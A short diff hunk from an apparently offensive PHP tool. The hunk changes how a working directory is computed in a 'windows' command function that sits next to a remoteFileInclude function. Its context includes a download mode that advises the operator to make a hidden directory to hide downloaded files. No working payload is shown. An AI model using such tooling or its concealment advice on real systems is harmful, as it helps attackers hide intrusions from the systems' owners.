@@ -313,7 +313,7 @@ function remoteFileInclude(string $targetFile)
 
 function windows($com, $r){
     if (!empty($com) && !empty($r)){
-        $cdir = dirname(__DIR__ . "\\" .PHP_EOL);
+        $cdir = dirname("." . "\\" .PHP_EOL);
         if ($r == "dl") {
             echo("\nThis is quite noisy, you should make a hidden directory in order to hide these..\n");
             switch (strtolower($com)) {
